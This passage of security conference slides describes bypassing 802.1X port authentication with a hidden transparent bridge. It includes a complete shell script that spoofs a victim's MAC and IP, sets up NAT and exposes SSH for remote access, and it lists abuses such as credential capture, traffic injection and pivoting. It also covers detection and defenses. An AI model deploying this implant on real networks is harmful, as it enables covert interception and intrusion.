aught to be able to collect what we need quickly.
The downside is that it’s possible if there is a lot of 
intersegment communication that we can’t easily 
find the gateway
TCP Analysis
TCP services, such as Active Directory, web, Kerberos, 
will give us everything we need in one packet 
assuming the services are in a different segment.
# tcpdump –nne tcp
19:27:28.390751 c0:c1:c0:76:35:7c > 
00:0c:29:ea:ed:ee, ethertype IPv4 (0x0800), length 
1514: 192.168.0.10.49776 > 10.0.1.3.80: . 
113771:115231(1460) ack 1560 win 256
TCP Analysis (2)
TCP looks like it might be the way to go on a 
network that has Active Directory.  
For example, from a cold boot to login on a 
windows 7 box connected to a domain, I 
captured almost 600 TCP packets, all of them to 
the domain controller.  More traffic to the DC 
every 15 minutes on a completely idle system.
TCP: The Downside
In order to collect enough TCP packets we need 
to wait until an AD traffic burst or, somebody 
logs in, mounts some shares, visits a web page, 
etc… 
TCP Consensus
TCP is probably the safest way to go.  However 
it’s going to take some time to see the traffic 
crossing the wire unless we have some 
interaction or we help it along. 
ARP vs. TCP
On a populated network, ARP is going to be 
faster and potentially inaccurate whereas TCP 
will be slower and more accurate.
I’ve implemented it both ways.  The code is fairly 
similar, but for the sake of the presentation I’m 
going to use TCP and reboot the windows box to 
speed things up.
Automated Implementation (ARP)
• Start Transparent
• Start sniffing ARP traffic
– tcpdump -i eth3 -s0 -w /boot.pcap -c50 arp
– 50 packets seems like a good number
• Analyze the ARP replies
• Grab the info from ARP replies
• Grab the info from an ARP request 
ARP Reply Analysis
ARP Replies provide most of what we need.  With a little kung-fu:
tcpdump -r boot.pcap -nne | grep 'is-at' | awk '{ print $2 "," $4  $12 "," 
$14}' | sort | uniq -c | sort -rn | head -1
The Answer will look something like this:
6 00:1b:fc:9d:2e:ef,00:26:b9:1b:02:97,192.168.15.1,00:1b:fc:9d:2e:ef
6 is the number of times the line appeared
00:1b:fc:9d:2e:ef is the MAC address of the SRC MAC
00:26:b9:1b:02:97 is the MAC address of the Computer 
192.168.15.1 is the IP address of the SRC
00:1b:fc:9d:2e:ef is the same as the first MAC address
We can pipe the command above to another AWK statement to end up with just the 
SRC MAC and the computer MAC
awk -F ‘,’     ‘{print $2}’     # this yields the Computer MAC
awk -F ‘,’     ‘{print $3}’     # this yields the Gateway IP
awk -F ‘,’    ‘{print $4}’     # this yields the gateway MAC
The Final Piece (ARP)
In order to get the computer IP, now we need to grep
for who asked for the gateway IP
17:58:26.552515 00:26:b9:1b:02:97 > ff:ff:ff:ff:ff:ff, ethertype ARP 
(0x0806), length 60: arp who-has 192.168.15.1 tell 192.168.15.129
# $COMPMAC is the computer’s MAC, $GWIP is the gateway IP 
tcpdump -r boot.pcap -nne | grep $CMPMAC | grep -w "$GWIP tell“ | 
head -1
We use the extra “-w” and the quotes so that we have an exact match 
for the gateway IP, otherwise we could match more than we wanted 
(you don’t want to know how long that took me to figure out)
Automated Implementation (TCP)
• Starts transparent
• Sniff TCP traffic for AD packet(135/445/88)
– tcpdump -r reboot.pcap -nne -c 1 tcp dst port 88
– Don’t really need more than one packet
• Grab the stuff we need from the packet
• ?
• Profit!
TCP Analysis
Our kung-fu looks like:
tcpdump -r boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | 
cut -f 1-4 -d .
Our Result looks like:
c0:c1:c0:76:35:7c,00:0c:29:ea:ed:ee,192.168.0.10
Where:
c0:c1:c0:76:35:7c is the source MAC (computer)
00:0c:29:ea:ed:ee is the destination MAC (gateway)
192.168.0.10 is the computer’s IP
Fully Automated TCP
#pre populated variables
SWINT=eth0
SWMAC=`ifconfig $SWINT | grep -i hwaddr | awk '{ print $5 }'`
BRINT=br0
COMPINT=eth3
BRIP=169.254.66.66
RANGE=61000-62000
DPORT=9876
#build the bridge
brctl addbr $BRINT
brctl addif $BRINT $COMPINT
brctl addif $BRINT $SWINT
Fully Automated TCP (2)
#bring up both sides of the bridge
ifconfig $COMPINT 0.0.0.0 up promisc
ifconfig $SWINT 0.0.0.0 up promisc
# ensure the bridge has the right MAC
macchanger -m $SWMAC $BRINT
#bring up the bridge (transparent)
ifconfig $BRINT 0.0.0.0 up promisc
# force the link to reset
mii-tool -r $COMPINT
mii-tool -r $SWINT
#grab a single tcp port 88 packet destined for the DC (kerberos)
tcpdump -i $COMPINT -s0 -w /boot.pcap -c1 tcp dst port 88
Fully Automated TCP (3)
#set our variables
COMPMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | 
awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
GWMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk
'{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $2}'`
COMIP=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk
'{print $3","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $3}'`
#start dark
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP
# bring up the bridge with our bridge IP
ifconfig $BRINT $BRIP up promisc
Fully Automated TCP (4)
# create rules to source NAT the $COMPMAC
# for traffic leaving the device  from the bridge mac address
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j 
snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat
--to-src $COMPMAC
# a static arp entry for our bogus default gateway
arp -s -i $BRINT 169.254.66.1 $GWMAC
#add our default gateway
route add default gw 169.254.66.1
Fully Automated TCP (5)
#use DNAT to map $DPORT to $brip:22
iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to 
$BRIP:22
# set up the source nat rules for tcp/udp/icmp
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to 
$COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to 
$COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP
#start sshd
/etc/init.d/ssh start
#lift radio silence
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP
Automated Demo (TCP)
DETECTION, USES, AND FINAL 
THOUGHTS
Detection
So how do we detect whether or not this is 
happening on our network?
Are there any good ways to detect this attack?
User Awareness
• 
• The same users that prompted us to implement 
802.1X by bringing in personal laptops
• Physical inspection / searching under desks
– A user would need to know what should be there
– A label on it that said “Network Signal Booster” would 
probably suffice to bypass the average user’s attention
Likely Result : Fail
P0f Style Traffic Analysis
• Traffic characteristics different for Windows vs
Linux
– Linux TTL 64, Newer Windows 128
• Easily tunable  under linux /proc/sys/net/ip_default_ttl
• Could be sniffed and then applied easily
• Although if the device got burned because somebody 
noticed out of whack TTL values I’d be more than tempted 
to just give it to them ☺
– Default TCP Window size differs between Windows 
and Linux
• Haven’t found a good way of tuning that under Linux
Likely Result : Possibly Burned
Other Weird Traffic on the Local Segment
Traffic destined for the local subnet will have the 
gateway’s MAC address as the destination.
• Decent fingerprint for something weird going on
• Hard to fix without additional information on the 
local wire
– Network / netmask required for a static route
– Could watch ARP requests and populate a static list of 
local ARP entries to get around it
– Possibly repurpose something like arpwatch
Likely Result : Possibly Burned
Network Latency
• All network traffic passes through the bridge, so 
inherent latency increase
• Could be as much as 2 orders of magnitude
• Hard to measure accurately
– Saturated link or switch will already have latency 
issues
– Users can’t tell if their requests take a few extra 
milliseconds
Likely Result : Fail
Network Throughput
• Like latency, hard to measure effectively
• Mostly a “feels slower” sort of thing from the 
user
• User traffic isn’t that drastic under normal 
circumstances
• I was able to SCP a 3.5Gb file on a local 
segment through the plug at ~70Mbs on a 
100Mbs link
Likely Result : Fail
Link Speed/Duplex Mismatch
Astute network admins could notice if a link 
went from 1Gig to 100Mb or from half duplex to 
full duplex
– Depending on the size of the organization this is 
unrealistic (100s of computers)
– Very rarely is all the computing equipment the 
same, so some may very well still be 100Mb 
instead of 1Gig
– With everything else the average admin has going 
on, it is unlikely this will catch anything
Likely Result : Fail
Excessive Up/Down Notices
• In the average workplace, link changes 
probably happen somewhat frequently
– User kicks a cable
– Reboots / Suspend / Sleep
– Power Fluctuation
• As long as the device authenticates and port 
security isn’t tripped, a few extra link 
up/down notices probably wouldn’t get 
caught.
Likely Result : Fail
Detection Summary
The best technological solution is to know what 
your traffic’s IP characteristics are.  Other possible 
indicators  include link/speed changes, excessive 
link up/down notices, etc.  Might be possible to 
create a SIEM event looking for such things.
The best method is probably user training and 
awareness.  Educate the users what should be 
under their desk and encourage them to ask 
questions if they see something unusual.
Possible Uses
How could this be useful during an assessment?  
What havoc could be wrought?
• Man in the middle attacks come to mind
– Poison web traffic via proxy or ettercap
• Perform client side attacks for any website by injecting 
your own code
– Capture credentials 
– SSL proxying
– Imagine sending phishing where email just 
appears in the inbox without sending any email
More Evil
• Network pivoting
– Attack the local network resources and make it 
look like it came from the client computer
– Have callbacks that are directed inwards and don’t 
cross firewall/IDS boundaries
• Be able to conduct a local/trusted insider 
assessment remotely
– Have the client plug in the device somewhere
– Work from your remote location
– Save on travel costs
Common Alibis
We use fiber.  Your puny attack won’t work on us.
• Fiber is just a transport mechanism
– Substitute a fiber optic cable instead of a cat 5/6
• Everything still works the same way
– Ethernet frames, IP addresses, everything
• Fiber converters work just fine
• More crap to stuff under the desk and chew up 
power, but it works awesome (demo time 
permitting)
Common Alibis (2)
Hah!  We use NAC/NAP.  Our agents will stop this!
• NAC/NAP implementations use 802.1X as their 
basis, agents simply handle the policy decisions
• Since all we’re doing really is disconnecting and 
reconnecting the cable, as long as the credentials 
work to authenticate to the network it doesn’t 
matter
• And since disconnects aren’t that unusual…
Defenses
How can we defend this?
• Basically it’s a physical attack
– If somebody can plant a malicious device on your 
network you’re already screwed
• Requires an authorized port with an active client 
to work
– If there’s no computer plugged in, it won’t work
Defenses (2)
• IPSEC could be used to mitigate some of the 
damage
– Point-to-point encrypted tunnels would prevent 
much of the MITM possibilities
– Microsoft’s NAP solution does this, but everything 
would need to use IPSEC, even internet traffic
Conclusions and Final Thoughts
• 802.1X only authorizes a port to go hot and 
pass traffic
• It doesn’t do anything for per packet 
authorization
– That’s 802.11AE or some other future technology
Questions?
Shouts!
Pete/Chris/Matt/Aaron/Mike/Devin
Grep8000/Nelson/Lee/Nischit/Roman/Will
Daryl/Nathan/Guy/Ermin/Charles/Deb/Dad
And many, many more…
Reference Links, etc
Classic 802.1X attack
•
http://sl.mvps.org/docs/802dot1x.htm
•
http://technet.microsoft.com/en-us/library/cc512611.aspx
802.1D
•
http://standards.ieee.org/develop/regauth/tut/macgrp.pdf
•
http://en.wikipedia.org/wiki/IEEE_802.1D
Marvin
•
http://www.gremwell.com/marvin-mitm-tapping-dot1x-links
Ephemeral Ports Info from Microsoft
•
http://support.microsoft.com/kb/929851
802.1xbridge.com
• Updated with all scripts, slides, etc…
– Will hopefully have all info uploaded by the end of 
DEFCON 19
• Low volume twitter: @8021xbridge